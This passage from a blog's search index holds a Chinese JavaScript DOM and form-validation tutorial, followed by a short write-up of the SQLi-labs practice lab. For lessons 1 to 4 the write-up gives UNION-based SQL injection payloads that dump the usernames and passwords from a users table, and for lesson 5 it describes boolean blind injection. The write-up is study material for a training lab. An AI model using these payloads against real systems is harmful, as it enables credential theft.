id=&quot;container&quot;&gt;元素</span></span><br><span class="line"><span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line"><span class="comment">// 获取&lt;div&gt;元素的第一个子节点</span></span><br><span class="line"><span class="keyword">var</span> firstChild = container.<span class="property">firstChild</span>;</span><br><span class="line"><span class="comment">// 删除第一个子节点</span></span><br><span class="line">container.<span class="title function_">removeChild</span>(firstChild);</span><br></pre></td></tr></table></figure><ul><li>修改节点：修改<code>&lt;div id=&quot;container&quot;&gt;</code>中的第一个子节点的样式和文本内容。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取&lt;div id=&quot;container&quot;&gt;元素</span></span><br><span class="line"><span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line"><span class="comment">// 获取&lt;div&gt;元素的第一个子节点</span></span><br><span class="line"><span class="keyword">var</span> firstChild = container.<span class="property">firstChild</span>;</span><br><span class="line"><span class="comment">// 修改子节点的样式属性，设置字体颜色为红色</span></span><br><span class="line">firstChild.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line"><span class="comment">// 修改子节点的文本内容，添加感叹号</span></span><br><span class="line">firstChild.<span class="property">innerHTML</span> += <span class="string">&quot;!&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>查询节点：查询所有有<code>class=&quot;item&quot;</code>属性的元素，并打印它们的文本内容。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询所有有class=&quot;item&quot;属性的元素，返回一个数组</span></span><br><span class="line"><span class="keyword">var</span> items = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;item&quot;</span>);</span><br><span class="line"><span class="comment">// 遍历数组中的每个元素，打印它们的文本内容</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(items[i].<span class="property">innerHTML</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-操作表单（验证）"><a href="#7-操作表单（验证）" class="headerlink" title="7.操作表单（验证）"></a>7.操作表单（验证）</h2><ul><li><p>文本框 input &#x3D; text</p></li><li><p>下拉框&lt; select &gt;</p></li><li><p>单选框 radio</p></li><li><p>多选框 checkbox</p></li><li><p>隐藏域 hidden</p></li><li><p>密码框 password</p></li><li><p>获得表单的值：可以使用<code>document.forms</code>或者<code>document.getElementById()</code>等方法来获取表单元素，然后使用<code>value</code>属性来获取表单元素的值。例如，如果有一个表单元素<code>&lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;</code>，可以用以下代码来获取它的值：</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取表单元素</span></span><br><span class="line"><span class="keyword">var</span> nameInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 获取表单元素的值</span></span><br><span class="line"><span class="keyword">var</span> nameValue = nameInput.<span class="property">value</span>;</span><br></pre></td></tr></table></figure><ul><li>设置表单的值：可以使用<code>document.forms</code>或者<code>document.getElementById()</code>等方法来获取表单元素，然后使用<code>value</code>属性来设置表单元素的新值。例如，如果想要将上面的表单元素的值设置为”Tom”，可以用以下代码来实现：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取表单元素</span></span><br><span class="line"><span class="keyword">var</span> nameInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 设置表单元素的新值</span></span><br><span class="line">nameInput.<span class="property">value</span> = <span class="string">&quot;Tom&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>（表单提交验证）通过向form标签中添加onsubmit事件实现表单提交：可以在form标签中添加一个onsubmit属性，指定一个js函数来验证表单数据是否合法，如果合法则返回true，否则返回false。例如，如果有一个表单元素<code>&lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;</code>，可以用以下代码来验证它是否为空：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return validateForm()&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取表单元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> nameInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取表单元素的值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> nameValue = nameInput.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 判断表单元素的值是否为空</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (nameValue == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 弹出提示信息</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">&quot;请输入姓名&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 阻止表单提交</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 允许表单提交</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>通过向按钮中添加onclick事件触发js函数以提交表单：可以在按钮元素中添加一个onclick属性，指定一个js函数来验证表单数据是否合法，如果合法则调用<code>form.submit()</code>方法来提交表单，否则不做任何操作。例如，如果有一个表单元素<code>&lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot;&gt;</code>，可以用以下代码来验证它是否为空：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myForm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;validateForm()&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取表单元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> nameInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取表单元素的值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> nameValue = nameInput.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 判断表单元素的值是否为空</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (nameValue == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 弹出提示信息</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">&quot;请输入姓名&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 不做任何操作</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取form元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myForm&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 提交form元素</span></span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Acknowledge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlilabs通关</title>
      <link href="/2023/06/30/Sqlilabs%E9%80%9A%E5%85%B3/"/>
      <url>/2023/06/30/Sqlilabs%E9%80%9A%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="Sqlilabs通关ing"><a href="#Sqlilabs通关ing" class="headerlink" title="Sqlilabs通关ing"></a>Sqlilabs通关ing</h1><h2 id="Page1"><a href="#Page1" class="headerlink" title="Page1"></a>Page1</h2><h3 id="lesson1"><a href="#lesson1" class="headerlink" title="lesson1"></a>lesson1</h3><p>提交数据为字符串，加单引号闭合。通用步骤：检测是否存在sql注入漏洞，判断注入点，判断数据提交方式构造闭合，order by查显示字段，database等查信息，查表名，查列名，查敏感信息。                                </p><p>payload：1‘ union select 1,group_concat(username),group_concat(password) from users#</p><h3 id="lesson2"><a href="#lesson2" class="headerlink" title="lesson2"></a>lesson2</h3><p>提交数据为数字，不用闭合</p><p>payload：1 and 1&#x3D;2 union select 1,group_concat(username),group_concat(password) from users#（正常查询后面加个and 1&#x3D;2 可以防止输出正常查询的内容）</p><h3 id="lesson3"><a href="#lesson3" class="headerlink" title="lesson3"></a>lesson3</h3><p>通过报错信息看出闭合方式 ‘)</p><p>payload：1’ and 1&#x3D;2) union select 1,group_concat(username),group_concat(password) from users–+</p><h3 id="lesson4"><a href="#lesson4" class="headerlink" title="lesson4"></a>lesson4</h3><p>通过报错信息看出闭合方式“)</p><p>payload：1” and 1 &#x3D; 2) union select 1,group_concat(username),group_concat(password) from users–+</p><h3 id="lesson5"><a href="#lesson5" class="headerlink" title="lesson5"></a>lesson5</h3><p>无回显，盲注，有报错，尝试布尔盲注    and 错误条件  来尝试暴力破解，详见bindsql_bool.py脚本</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
